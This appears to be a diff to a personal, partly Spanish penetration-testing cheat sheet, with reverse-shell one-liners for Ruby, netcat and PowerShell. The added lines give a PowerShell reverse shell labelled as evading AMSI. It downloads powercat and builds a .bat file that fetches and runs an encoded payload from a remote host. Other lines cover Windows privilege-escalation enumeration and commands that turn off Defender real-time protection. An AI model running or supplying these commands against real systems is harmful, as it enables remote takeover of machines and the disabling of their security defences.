@@ -178,7 +178,10 @@ ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i 
 // Netcat
 nc -e /bin/bash 8.8.8.8 8080
 
-// PowerShell
+// PowerShell (with evasion AMSI)
+  1. pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c LHOST -p LPORT -e cmd.exe -ge" > /home/kali/Documents/rshell.txt
+  2. Create a .bat with this content --> START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.8.211.1:9000/rshell.txt');iex 'powershell -E $code'
+
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
 
 
@@ -848,6 +851,7 @@ ENUM PRIVESC
      Windows
           hostname
           whoami
+          whoami /groups
           whoami /priv
                 SeImpersonatePrivilege: As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.
                 SeAssignPrimaryTokenPrivilege: This privilege permits a process to assign the primary token of another user to a new process. It is used in conjunction with the SeImpersonatePrivilege privilege.
@@ -871,6 +875,7 @@ ENUM PRIVESC
           WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
           netsh advfirewall firewall dump
           Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+          REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin  ---> Comprobar si UAC está habilitado
           *Podemos probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros... → "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
           
 
